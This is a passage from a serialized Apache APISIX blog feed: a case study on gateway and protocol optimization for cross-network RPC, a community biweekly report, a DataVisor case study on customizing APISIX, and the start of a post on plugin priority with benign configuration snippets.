thoroughly understand potential bottlenecks in the cross-network RPC architecture. Without performance testing and robust data support, establishing the system\'s baseline would be challenging. Consequently, a series of performance tests were conducted to enhance our system optimization.\\n\\nThe testing scripts were intricately linked to the request volume, progressively increasing the size of requested data from 2 KB to 8 KB. During testing, specific conditions were set, such as halting the test when CPU utilization approached approximately 80%, and the disk switch reached around 80%. This allowed us to observe performance outcomes. By systematically adjusting these preconditions and incrementally scaling up the data load, we gained insights into the final performance metrics.\\n\\nOur findings pointed to the primary bottleneck being bandwidth. Performance discrepancies were most noticeable when variations in bandwidth were present. Despite retesting by tweaking gateway and CPU parameters, the results did not deviate significantly from the original, eliminating these potential influencing factors. Performance limitations surfaced in cases of data overload on the network. Thus, we inferred that the bottleneck lay in bandwidth. Particularly for different island ends, with each possessing distinct bandwidth capacities, coordination with the operations teams of each island end became imperative. For instance, Shanghai might have 30 Mbps of bandwidth, while Shanxi could boast 50 Mbps, illustrating superior performance in Shanxi.\\n\\nDrawing from the preceding analysis, we identified the primary issue as the traffic gateway and the secondary concern as the imperative need for HTTP protocol optimization.\\n\\n## Gateway Optimization in Practice\\n\\n### Challenges with Custom Dubbo Gateway\\n\\nWhen using our custom Dubbo gateway, we\'ve encountered several challenges.\\n\\n* **I/O Mode:** Converting Dubbo to HTTP essentially employs a tunneling mechanism. Due to the intricacies of the network, we\'ve opted for using HTTP as the conduit to transmit data through this tunnel, which is later unpacked at the destination. One drawback of this tunneling approach is that there\'s a need for protocol data conversion within this tunnel, particularly when reaching the Dubbo gateway. Some of the components we developed ourselves might not achieve optimal performance.\\n\\n* **Dual Serialization:** When dealing with dual serialization, it involves a JavaBeanDescriptor object, an API in Dubbo. During serialization and deserialization, business objects can\'t be directly serialized in parameters, requiring encapsulation in the SDK to convert JavaBeans into a structure internal to Dubbo. After reaching the destination, this process is reversed to ensure smooth serialization and deserialization of business objects in the parameters. Moreover, there is an additional layer of complexity due to Dubbo\'s use of Hessian2 for serialization. Using Hessian2 for dual serialization could introduce a significant performance overhead.\\n\\n* **Other Business Extensions:** The Dubbo gateway demands certain business extensions, not just on the central gateway but also on the local cluster gateway. Additionally, we need some readily deployable features, such as rate limiting.\\n\\n### Reasons for Opting for APISIX\\n\\nWe have decided to replace our internally developed Dubbo gateway with APISIX for several reasons. Given the potential challenges associated with our custom gateway, we prefer not to allocate excessive resources in this domain. Instead, we plan to integrate a pre-built, professional solution immediately to conserve development resources and enhance efficiency. The decision to choose APISIX is influenced by the following factors, providing insights for others:\\n\\n* **Vibrant Community, Code Excellence:** APISIX boasts an actively engaged open-source community, ensuring a high standard of code quality.\\n\\n* **Robust Architecture, Exceptional Performance:** Developed on the foundation of high-performance OpenResty, APISIX is designed to achieve performance excellence from both architectural and design perspectives, meeting our fundamental requirements for gateway performance.\\n\\n* **Remarkable Extensibility:** APISIX demonstrates remarkable extensibility, accommodating our custom requirements. Essentially, we aim to benefit from NGINX-like high performance while retaining the flexibility to extend functionality based on our specific needs.\\n\\n## Optimizing Protocols\\n\\nIn terms of protocols, we experimented with adopting the Dubbo protocol as a tunneling protocol, replacing the conventional HTTP protocol.\\n\\n![Dubbo_optimization](https://static.apiseven.com/uploads/2023/12/26/bivRZ1ku_7.png)\\n\\n### Advantages\\n\\nLeveraging the Dubbo protocol as our tunneling protocol offers several key advantages:\\n\\n* **Seamless Integration with APISIX Gateway:** Given our reliance on the APISIX gateway, we aimed for a direct Dubbo-to-Dubbo transformation, eliminating the need for dual serialization rounds and bypassing calls to essential infrastructures. As discussed in the earlier HttpClient plan, employing a single-threaded synchronous calling method requires waiting for the completion of each call before proceeding with subsequent operations. In high-concurrency scenarios, this method proves highly inefficient, and previous solutions we employed gradually proved inadequate for accommodating our growing business volume, prompting the need for an update.\\n\\n* **Binary Protocol Prowess:** Binary protocols, in general, outshine their text-based counterparts, representing a relatively classical form of protocol.\\n\\n* **Elimination of Redundant Headers:** Various HTTP clients may carry superfluous Header information, and adopting the Dubbo protocol helps sidestep the inclusion of such invalid redundant data.\\n\\n* **Long Connection Multiplexing:** APISIX introduces multiplexing capabilities. Long connections facilitate the simultaneous transmission of multiple requests. In contrast, while HTTP allows continuous request dispatch, it requires waiting for the completion of each request before initiating subsequent ones. This disparity in concurrency efficiency is notable between HTTP and Dubbo.\\n\\n* **Layer 4 Protocol Extension Framework:** APISIX implements the xRPC Layer 4 protocol extension framework, empowering developers to tailor application-specific protocols. With the xRPC framework, APISIX supports proxy implementations for various major application protocols. Users can also introduce their private, TCP-based application protocols based on this framework, offering precision akin to the HTTP protocol proxy and elevated Layer 7 control. By harnessing APISIX\'s xRPC extension, we have effectively introduced the capability for direct Dubbo protocol forwarding, ensuring comprehensive Dubbo protocol transmission throughout the entire process.\\n\\n### Limitations\\n\\nUndoubtedly, during the utilization of the Dubbo protocol, certain distinctive limitations come to the forefront:\\n\\n* **Limited Permeability:** An evident challenge with the Dubbo protocol lies in its limited permeability. Considering Dubbo as a proprietary protocol, our network may traverse several physical devices, including not only software-based gateways (APISIX/NGINX/WAF) but also certain physical devices. This could potentially pose some obstacles.\\n\\n* **Inability to Selectively Retrieve Key Information:** Unlike the HTTP protocol, which can selectively extract Header information into the gateway\'s memory and efficiently forward the Body using a zero-copy approach, the Dubbo protocol falls short in this aspect.\\n\\nThroughout this practical experimentation, although we employed Dubbo, it essentially served as an exploratory endeavor. Our ability to harness it is contingent upon our internal infrastructure. Despite the seamless network within the internal cluster, the adoption of containerization through K8s has introduced distinct namespaces. Consequently, calls between these namespaces might only be feasible via domain names.\\n\\n### Results\\n\\nUpon the integration of the Dubbo protocol, we witnessed a remarkable improvement in optimization:\\n\\n#### Reduced Payload Size, Enhanced Network Throughput\\n\\nThe Dubbo protocol exhibits a more concise design with fewer carried header details. Its design prioritizes compactness, using 1 bit for representation where a byte is not necessary, such as with boolean type indicators. In contrast, HTTP, for broader compatibility, includes extensive contextual and metadata information in the request headers. For internal communication, where the server and client characteristics remain relatively constant, much of this additional information becomes redundant. Notably, Dubbo\'s official performance tests indicate that in scenarios involving high concurrency and small data volumes, the Tps (transactions per second) of the Dubbo protocol surpasses that of HTTP by approximately 30%-50%.\\n\\nMoreover, Dubbo leverages long-lasting connections, allowing the recycling of established TCP connections, which effectively minimizes the costs associated with connection establishment.\\n\\n#### Reduced Overhead in Transport Protocol\\n\\nGiven that the entire pipeline adopts a unified protocol, it circumvents the packaging and unpackaging overhead inherent in dealing with different protocols.\\n\\n## Shortcomings in the Current Revamp\\n\\nIn the latter part of 2022, we amalgamated and upgraded various cross-island solutions, resulting in the current \\"highway\\" scheme. This ensures standardized cross-island practices and resolves numerous business challenges encountered in previous approaches. By replacing the tunnel protocol, our goal was to optimize the network I/O model and enhance link-forwarding efficiency. Preliminary tests showed a reduction of around one-third of the Round Trip Time (RT) for a single 2k packet request.\\n\\nHowever, practical business scenarios have revealed some emerging challenges in this architecture.\\n\\n### Inadequate Scenario Support\\n\\nFor companies with a business structure akin to ours, where the cloud platform belongs to the company\'s internal and fully controllable LAN, and the island side operates on its secure network policy, our cross-network RPC needs to traverse various devices and gateways in the mixed cloud network to reach services on the other side of the cloud island. The Dubbo protocol, being a proprietary protocol, is not universally suitable for most cross-island scenarios.\\n\\nPresently, this mode can only be employed in certain internal networks, such as communication between independently deployed AI clusters and platform business clusters. However, leveraging the excellent scalability of the \\"highway\\" architecture allows us to automatically switch protocols in different scenarios. This way, while benefiting from the advantages of the Dubbo protocol, we can also fall back to the HTTP protocol. Importantly, our protocol extension doesn\'t entail the removal of existing protocols.\\n\\n### Insufficient Enhancement of Network Throughput\\n\\nWhen dealing with interfaces that require the transmission of a substantial amount of data, and this data cannot be accommodated within a single RPC request or response, it necessitates sending the data in batches. Under the Dubbo protocol, such scenarios are processed sequentially. Despite the Dubbo protocol\'s commendable performance for individual requests, there is still room for improvement in overall throughput.\\n\\nAs previously mentioned, before the initial version of our cross-network solution was rolled out, we conducted performance stress tests. The testing scenario involved cloud-side calls to the island, data uploads, 30Mbps bandwidth, and the incremental increase of concurrency while sending 2KB data. With 30Mbps entrance bandwidth and 2KB data, TPS exceeded 500/s, making entrance bandwidth the bottleneck. When the amount of sent data increased to 80KB, TPS decreased by approximately 16 times, and RT increased by about 1.5 times. Monitoring data indicates that once TPS reaches a certain threshold, bandwidth becomes a limiting factor.\\n\\nIn the current real-world business scenario of the \\"Highway,\\" throughput emerges as the primary bottleneck in the initial version. The recent upgrades to the gateway and protocol have notably reduced RT metrics, offering a considerable improvement in overall throughput.\\n\\n## Future Plans\\n\\n### Exploration of the Triple Protocol\\n\\nFollowing the extension of APISIX\'s protocol, we opted for APISIX to replace our in-house Dubbo gateway, achieving the anticipated optimization in communication efficiency. However, we have identified two significant pain points to address: scenario support and communication efficiency. Consequently, our focus turned to investigating the primary communication protocol of Dubbo3\u2014the Triple protocol.\\n\\nThe Triple protocol, designed by Dubbo3, is an RPC communication protocol based on HTTP. It fully embraces the gRPC protocol, supporting various communication models such as Request-Response and Streaming, and is compatible with both HTTP/1 and HTTP/2. Several features of the Triple protocol address our project\'s specific needs.\\n\\n* Full compatibility with the HTTP/2-based gRPC protocol: Despite the Triple protocol sounding like a proprietary solution, it\'s a standardized, public protocol compatible with both HTTP/1 and HTTP/2. This signifies robust penetrability, effectively resolving one of our pain points\u2014scenario support.\\n\\n* Compatibility with HTTP/1 and HTTP/2, exhibiting robust penetrability.\\n\\n* The efficiency boost introduced by binary framing, coupled with header compression significantly reducing payload, results in a substantial enhancement in network throughput for HTTP/2.\\n\\n* As the primary protocol for Dubbo, it retains the advantage of sidestepping protocol conversion, aligning seamlessly with the \\"Highway\\" architecture.\\n\\n### APISIX Extending Triple\\n\\n![APISIX_triple](https://static.apiseven.com/uploads/2023/12/26/x7tTAqj3_8.jpg)\\n\\nAPISIX leverages its xRPC mechanism to seamlessly extend new application protocols. The xRPC not only provides us with the ability to replay interfaces but also enhances the intuitiveness of implementing custom protocols. Building upon the lessons learned from previous use cases, like Redis, which has successfully extended protocols, we find APISIX to be a versatile platform.\\n\\nIn our hands-on experience with various protocol extensions, APISIX stands out as a platform based on NGINX capable of forwarding TCP layer-4 protocols. While it is entirely feasible to use NGINX to route Dubbo to other network clusters due to its focus on TCP layer-4 protocols, we\'ve chosen to extend APISIX. The reason behind this choice lies in the necessity to not just forward TCP protocols and data but also read and process this data. Whether implementing rate limiting or other essential features, we find it crucial to carry out these tasks at this level.\\n\\nBy integrating the Triple protocol extension into APISIX during this process, we have effectively organized data into a structure akin to a session. This case means that when developing plugins, we can seamlessly pass read header information and other relevant content to the plugin, facilitating the extension of functionalities\u2014a significant advantage aligning with our architectural needs.\\n\\n### Elevating the Triple Protocol\\n\\nBuilding on the insights gained from working with the Dubbo2 protocol, our focus now shifts to driving the upgrade of the Triple protocol to tackle performance issues.\\n\\n### Validating Performance through Stress Testing\\n\\nOur architecture has undergone comprehensive stress testing, providing us with a clear understanding of existing bottlenecks. Moving forward, our commitment extends to continuous testing, delving deeper into the untapped performance potential of this foundational infrastructure.\\n\\n### Charting the Course for the Future High-Speed Highway Architecture\\n\\n![Highway_future](https://static.apiseven.com/uploads/2024/01/29/YYqx5vTw_9_1.jpg)\\n\\nLooking at the architecture\'s evolution, there is a potential shift on the horizon: the former Java-based Dubbo gateway has now evolved into APISIX. We have initiated the adoption of this model in our testing environment and ongoing research. However, this transition has not been implemented in the production environment as of now. Our strategy involves upgrading the entire cluster post the complete implementation of Triple."},{"id":"Biweekly Report (December 04 - December 17)","metadata":{"permalink":"/blog/2023/12/20/bi-weekly-report","source":"@site/blog/2023/12/20/bi-weekly-report.md","title":"Biweekly Report (December 04 - December 17)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-12-20T00:00:00.000Z","formattedDate":"December 20, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.425,"truncated":true,"authors":[],"prevItem":{"title":"Building a Robust \'Highway\' with APISIX: Gateway and Protocol Performance Optimization","permalink":"/blog/2023/12/26/zhengcaiyun-uses-apisix"},"nextItem":{"title":"Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX","permalink":"/blog/2023/12/19/datavisor-uses-apisix"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The updates include adding `jwe decrypt` and `brotli` plugins, adding more attributes to `openid-connect` plugin, allowing `CORS` plugin to support Timing-Allow-Origin, and using lua-resty-events as the default event mechanism. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 12.04 to 12.17, a total of 21 contributors made 46 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently added and enhanced several plugins, and here is a summary of the updates:\\n\\n1. Add `jwe decrypt` plugin\\n\\n2. Add more attributes to `openid-connect` plugin\\n\\n3. Add support for the Timing-Allow-Origin header in `CORS` plugin\\n\\n4. Add `brotli` plugin\\n\\n5. Use lua-resty-events as the default event mechanism\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/12/20/qNS4Ydta_CON.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/12/20/GycOBJie_NEW.png)\\n\\n## Highlight of Recent Feature\\n\\n- [Add `jwe decrypt` plugin](https://github.com/apache/apisix/pull/10252) (Contributor: [fishioon](https://github.com/fishioon))\\n\\n- [Add more attributes to `openid-connect` plugin](https://github.com/apache/apisix/pull/10591) (Contributor: [kayx23](https://github.com/kayx23))\\n\\n- [Add support for the Timing-Allow-Origin header in `CORS` plugin](https://github.com/apache/apisix/pull/9365) (Contributor: [skimdz86](https://github.com/skimdz86))\\n\\n- [Add `brotli` plugin](https://github.com/apache/apisix/pull/10515) (Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n- [Add new lua-resty-events as the default event mechanism](https://github.com/apache/apisix/pull/10550) (Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n## Recent Blog Recommendations\\n\\n- [Apache APISIX plugin priority, a leaky abstraction?](https://apisix.apache.org/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction/)\\n\\n  Apache APISIX builds upon the OpenResty reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes.\\n\\n- [How to Supercharge Large-Scale Video Operations with APISIX](https://apisix.apache.org/blog/2023/12/14/migu-video-adopts-apisix/)\\n\\n  Author: Yu Xia, Senior DevOps Engineer at Migu Video Construction and Operation Center. This article is based on a presentation given by Yu Xia at the APISIX Shanghai Meetup in November 2023.\\n\\n- [Canary releases with Apache APISIX](https://apisix.apache.org/blog/2023/12/07/canary-releases-apisix/)\\n\\n  In a few words, the idea of canary releases is to deliver a new software version to only a fraction of the users, analyze the results, and decide whether to proceed further or not. If results are not aligned with expectations, roll back; if they are, increase the number of users exposed until all users benefit from the new version.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX","metadata":{"permalink":"/blog/2023/12/19/datavisor-uses-apisix","source":"@site/blog/2023/12/19/datavisor-uses-apisix.md","title":"Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX","description":"DataVisor not only uses APISIX in its production environment but also enhances APISIX through customization, and these efforts have proven successful in optimizing DataVisor\'s production processes.","date":"2023-12-19T00:00:00.000Z","formattedDate":"December 19, 2023","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":9.185,"truncated":true,"authors":[{"name":"Xiaobiao Zhao","title":"Author","url":"https://github.com/xiaobiaozhao","image_url":"https://github.com/xiaobiaozhao.png","imageURL":"https://github.com/xiaobiaozhao.png"},{"name":"Jing Yan","title":"Technical Writer","url":"https://github.com/JYan00","image_url":"https://github.com/JYan00.png","imageURL":"https://github.com/JYan00.png"}],"prevItem":{"title":"Biweekly Report (December 04 - December 17)","permalink":"/blog/2023/12/20/bi-weekly-report"},"nextItem":{"title":"Apache APISIX plugin priority, a leaky abstraction?","permalink":"/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction"}},"content":"> Author: Xiaobiao Zhao, DataVisor Senior Architect, Apache Kvrocks Committer, OpenResty and Apache APISIX Contributor. This article is based on a presentation given by Xiaobiao Zhao at the APISIX Shanghai Meetup in November 2023.\\n\x3c!--truncate--\x3e\\n\\nDataVisor specializes in risk control, focusing on preventing activities such as counterattacks and fraud. In our development at DataVisor, we not only use APISIX in our production environment but also enhance it through customization, including the secondary development of plugins, and these efforts have proven successful in optimizing DataVisor\'s production processes. Read on for a practical overview of how APISIX is applied at DataVisor.\\n\\n## Challenges\\n\\n* **Performance Pressure:** In the risk control industry, where performance metrics are crucial, DataVisor faces the challenge of ensuring the timely and efficient execution of risk control calculations. Delays in these calculations could lead to a loss of control over potential risks in this competitive and risk-prone environment.\\n* **Balancing Security and User Experience:** The primary goal of risk control tasks is to intercept potentially harmful user actions while preserving a seamless user experience. DataVisor\'s system must ensure user safety without compromising the natural flow of user interactions, posing a challenging balance.\\n* **Difficulty with Gateway Tools Meeting Requirements:** Many API gateway tools on the market face issues like high latency or erratic performance. Such challenges can impact the stability and availability of DataVisor\'s system, especially when efficiently managing business traffic is crucial. Therefore, choosing a stable, low-latency API gateway tool is crucial for maintaining the system\'s smooth operation.\\n\\n## Implementing APISIX in the Production Environment\\n\\nIn product development, DataVisor has adopted a comprehensive gateway and authentication solution. APISIX is not just a standalone component within the product ecosystem; it collaborates with other products like AWS API Gateway, Application Load Balancer (ALB), Imperva, and an integrated OAuth authentication mechanism. All these tools, each equipped with gateway functionalities, work together to facilitate traffic access within our system.\\n\\n![APISIX_Datavisor](https://static.apiseven.com/uploads/2023/12/01/98FBGSY0_1.png)\\n\\n### Why We Chose APISIX\\n\\nWhen deciding on a solution for our production setup, we carefully compared options and settled on APISIX for several reasons:\\n\\n1. **Cost-Effectiveness:** Compared to basic application gateways from cloud providers (like ALB), APISIX offers significant cost savings for our operations.\\n2. **High Performance, Low Latency:** APISIX stands out for its outstanding performance. Unlike other API Gateway tools, APISIX not only avoids noticeable delays but is also less prone to performance spikes, such as P99 or P9999, which ensures a smoother experience without significant latency issues.\\n3. **Industry-Specific Focus:** In the field of risk control, our business system requires a rapid risk control computation time of 50 milliseconds. Failing to complete this computation promptly results in the immediate dismissal of the risk control result. The main goal of risk control is to intercept potentially harmful user actions without disrupting their normal activities.\\n\\n### Utilizing APISIX in Practice\\n\\nCurrently, we are expanding the usage of APISIX across a growing range of business scenarios.\\n\\nGiven that DataVisor does not engage in direct business activities and primarily serves various vendors who call upon our services, APISIX acts as the gateway for traffic deployed on the public network. This deployment approach may seem somewhat unconventional in practical scenarios. Typically, APISIX might be situated on an intranet or one layer below the public network. However, our strategy to deploy it directly on the public network allows APISIX to efficiently manage traffic originating from diverse business channels.\\n\\n![APISIX_Datavisor_process](https://static.apiseven.com/uploads/2023/12/01/aN1bmljK_2.png)\\n\\nTo offer a more concrete understanding of how we implement APISIX in our production environment, a typical use case is provided below.\\n\\nCustomer A initiates access to our system via the red route to acquire an authorization access token. Subsequently, it interacts with our internal authorization server or connects to other authorization servers, such as the widely used Okta, through APISIX. Our primary authentication mechanism involves routing all traffic to Okta for the initial authentication process.\\n\\nOnce customers obtain different tokens, APISIX\'s routing capabilities will direct this authenticated traffic to various Kubernetes clusters. Presently, we have deployed an active-active Kubernetes cluster, with traffic being routed to either Cluster A or Cluster B. Typically, we direct traffic to one Kubernetes cluster, while the other serves as a reserve, only handling traffic during extensive upgrades or cluster updates.\\n\\n![APISIX_Datavisor_server](https://static.apiseven.com/uploads/2023/12/01/w2VYY9Ji_3.png)\\n\\nRegarding the usage of the gateway, we have opted for a relatively straightforward and standard deployment approach. An interesting observation is that we can place APISIX outside our Kubernetes cluster. This step is made possible by APISIX\'s outstanding performance, requiring minimal CPU resources. Utilizing smaller instances outside the cluster to deploy APISIX has proven effective in handling significant network traffic.\\n\\nIn our production setting, we have deployed three APISIX nodes, each potentially configured with only two cores. We employ minicomputers with 2G or 4G of memory to manage the traffic load. If there are concerns about APISIX\'s performance, I am confident they can be put to rest. Its performance is expected to rival that of NGINX and OpenResty, and perhaps even surpass my initial expectations.\\n\\n## Customizing APISIX\\n\\n### Enhancing the Privileged Process\\n\\nWhile there is not a concept of privileged process in NGINX, it is present in OpenResty, where it stands at the same level as worker processes. This process is somewhat special because it doesn\'t handle incoming network traffic\u2014it does not listen on any ports. However, it can perform various computations and data collection tasks. As a result, we have extended this privileged process to cater to our specific needs.\\n\\n![APISIX_Datavisor_backend](https://static.apiseven.com/uploads/2023/12/01/VNkXA43W_4.png)\\n\\nThe diagram above provides a clear overview of the relationship between APISIX and our backend services. Our primary utilization of APISIX is for receiving and distributing traffic.\\n\\nAt the gateway level, APISIX conducts pre-processing before the traffic enters. What sets our configuration apart is the introduction of a small process at the APISIX layer. This process, functioning akin to a Sidecar, operates concurrently with the APISIX process, responsible for executing its designated tasks. Following this step, it transmits the gathered data to APISIX, which, in turn, conveys it back to the upper layer of the system to perform specific business rules. While this usage pattern is relatively uncommon and typically not encountered in common business scenarios, it may be applicable in risk control.\\n\\n![APISIX_Datavisor_worker](https://static.apiseven.com/uploads/2023/12/01/AXvYYBiG_5.png)\\n\\nHow is the implementation of the privileged process handled? Our model typically follows a master-worker structure, with worker processes responsible for managing business traffic and the master process forking a unique privileged process. In our development, we restrict the privileged process to just one. Thus, we have devised a distinct strategy: within the privileged process, we fork another process to handle additional tasks, ensuring it does not interfere with the demanding responsibilities of the privileged process.\\n\\nFor data collection, communication between the privileged process and worker processes is facilitated through a shared-dict. The performance of shared-dict is notably robust, meeting the demands of the majority of scenarios.\\n\\n### Expanding ssl-certificate-phase\\n\\n![APISIX_Datavisor_clienthello](https://static.apiseven.com/uploads/2023/12/01/CPnBHmIW_6.png)\\n\\nExpanding the ssl-certificate-phase involves integrating APISIX using the NGINX + Lua framework. Initially, APISIX lacked support for extensive script injection during the TLS handshake phase. When the OpenResty community later introduced the ability to inject code during the ssl-client-hello phase, we noticed a lag in the APISIX community\'s adoption. Consequently, we had to manually modify APISIX.\\n\\nReferencing the existing code structure, we introduced our code into the APISIX process, enabling its execution during the client-hello phase. While Lua provides several capabilities during this phase, it has some limitations. In many scenarios, we find it beneficial to utilize NGINX for module development or create a small dynamic library for NGINX to accomplish specific tasks.\\n\\nPresently, OpenResty and Lua showcase exceptional capabilities in loading dynamic libraries. The Foreign Function Interface (FFI) feature allows seamless integration of dynamic libraries. Defining the necessary external interfaces in the dynamic library and exporting functions to Lua through simple FFI commands results in unexpectedly improved performance. Code written in this FFI + Lua pattern performs comparably to code written purely in the C language, achieving around 70% of its performance. In essence, it stands out as a top-performing solution. Furthermore, as runtime increases, performance tends to exhibit further enhancements.\\n\\n### Developing Plugins\\n\\n![APISIX_Datavisor_plugin](https://static.apiseven.com/uploads/2023/12/22/k1Lg7rBk_7.jpg)\\n\\nAs a result of our modifications to APISIX, numerous functionalities in the packaged product are embedded deeply within the project, making dynamic adjustments challenging. Accordingly, we opted to package specific plugins, integrate them into the APISIX project, and then make modifications using the Dashboard.\\n\\nThe process of developing plugins with APISIX is highly convenient and facilitates the effortless creation of high-performance plugins. Presently, APISIX supports not only Lua for plugin development but also multiple programming languages such as Java, Go, and Python. This versatility empowers users to implement a diverse array of functionalities.\\n\\n## Benefits of APISIX on Production\\n\\nThe deployment of APISIX has resulted in an overall enhancement of our system\'s performance, yielding exceptional production outcomes.\\n\\n* **Latency Reduction:** One of the standout features of APISIX is its remarkable ability to substantially reduce latency. In comparison to alternative solutions, we have observed shorter processing times for user requests, a critical factor in delivering a better user experience.\\n* **Throughput Boost:** The introduction of APISIX has led to a significant increase in throughput, allowing the system to handle concurrent requests with greater efficiency. Unlike using other API gateway products, we have achieved successful large-scale request processing, ensuring the stability and reliability of the system under high loads through APISIX. This outcome solidifies a dependable foundation for managing spikes in user traffic.\\n\\n![APISIX_Datavisor_effect](https://static.apiseven.com/uploads/2023/12/22/aHwCZUGj_8.png)\\n\\n## Outlook for APISIX\\n\\nAPISIX stands as a vibrant community committed to monthly version iterations. Therefore, we have two anticipated functional improvements for the upcoming development of APISIX.\\n\\n### Dynamic Addition and Update via the Dashboard\\n\\nCurrently, completing plugin development does not allow for hot updates. Transmitting plugins directly to the APISIX server through the post method is not feasible; it necessitates repackaging the APISIX server and restarting, particularly when it comes to the Dashboard. Hence, we hope APISIX can introduce hot update functionality, facilitating more convenient dynamic addition and updating of plugins through the Dashboard.\\n\\n### Support for CPU-Intensive Calculations using run_worker_thread\\n\\nNGINX introduced a specialized mechanism known as thread. These threads primarily handle non-network-related tasks, such as activities with high CPU utilization (data encryption/decryption and compression). Despite being unrelated to network I/O, high CPU usage may potentially cause some blocking of other network requests within the process.\\n\\nWith this in mind, I hope APISIX can implement a similar feature. The ability of APISIX to handle certain intricate functional computations, such as data encryption/decryption and caching, would be a valuable enhancement.\\n\\n### Summary\\n\\nTo sum up, DataVisor\'s application experience with APISIX is noteworthy. We prioritized the performance demands within the risk control domain and successfully addressed practical challenges through a distinctive approach to secondary development. These experiences have not only proven successful in technical implementation but have also established a sturdy foundation for our company\'s resilient operation in the risk control industry.\\n\\nThrough sharing these insights, we aim to offer beneficial references for other companies in the industry, collectively driving the ongoing innovation and progress of risk control technology."},{"id":"Apache APISIX plugin priority, a leaky abstraction?","metadata":{"permalink":"/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction","source":"@site/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction.md","title":"Apache APISIX plugin priority, a leaky abstraction?","description":"Apache APISIX builds upon the OpenResty reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes. In this post, I\'d like to describe how plugins, priority, and phases play together and what pitfalls you must be aware of.\\n","date":"2023-12-14T00:00:00.000Z","formattedDate":"December 14, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.255,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX","permalink":"/blog/2023/12/19/datavisor-uses-apisix"},"nextItem":{"title":"How to Supercharge Large-Scale Video Operations with APISIX","permalink":"/blog/2023/12/14/migu-video-adopts-apisix"}},"content":">[Apache APISIX](https://apisix.apache.org/) builds upon the [OpenResty](https://openresty.org/en/) reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes.\\n>\\n>In this post, I\'d like to describe how plugins, priority, and phases play together and what pitfalls you must be aware of.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/apisix-plugins-priority-leaky-abstraction/\\" />\\n</head>\\n\\n## APISIX plugin\'s priority\\n\\nWhen you configure a route with multiple plugins, Apache APISIX needs to execute them in a **consistent** order so that the results are the same over time. For this reason, every APISIX plugin has a _harcoded_ **priority**. You can check a plugin priority directly in the code. For example, here\'s the relevant code fragment for the `basic-auth` plugin:\\n\\n```lua\\nlocal _M = {\\n    version = 0.1,\\n    priority = 2520,                                 #1\\n    type = \'auth\',\\n    name = plugin_name,\\n    schema = schema,\\n    consumer_schema = consumer_schema\\n}\\n```\\n\\n1. Priority is 2520\\n\\nFor documentation purposes, the `default-config.yaml` file lists the priority of all out-of-the-box plugins. Here\'s an excerpt:\\n\\n```yaml\\nplugins:\\n  - ldap-auth                      # priority: 2540\\n  - hmac-auth                      # priority: 2530\\n  - basic-auth                     # priority: 2520\\n  - jwt-auth                       # priority: 2510\\n  - key-auth                       # priority: 2500\\n  - consumer-restriction           # priority: 2400\\n  - forward-auth                   # priority: 2002\\n  - opa                            # priority: 2001\\n  - authz-keycloak                 # priority: 2000\\n  #- error-log-logger              # priority: 1091\\n  - proxy-cache                    # priority: 1085\\n  - body-transformer               # priority: 1080\\n  - proxy-mirror                   # priority: 1010\\n  - proxy-rewrite                  # priority: 1008\\n  - workflow                       # priority: 1006\\n  - api-breaker                    # priority: 1005\\n  - limit-conn                     # priority: 1003\\n  - limit-count                    # priority: 1002\\n  - limit-req                      # priority: 1001\\n```\\n\\nImagine a route configured with `proxy-mirror` and `proxy-rewrite`. Because of their respective priority, `proxy-mirror` would run before `proxy-rewrite`.\\n\\n```yaml\\nupstream:\\n  - id: 1\\n    nodes:\\n      \\"oldapi:8081\\": 1\\n\\nroutes:\\n  - id: 1\\n    uri: \\"/v1/hello*\\"\\n    upstream_id: 1\\n    plugins:\\n      proxy-rewrite:                                 #1-3\\n        regex_uri: [\\"/v1(.*)\\", \\"$1\\"]\\n      proxy-mirror:                                  #2\\n        host: http://new.api:8082\\n```\\n\\n1. The plugin ordering in this file is not relevant\\n2. `proxy-mirror` has priority 1010 and will execute first\\n3. `proxy-rewrite` has priority 1008 and will run second\\n\\nThe above setup has an issue. For example, if we call 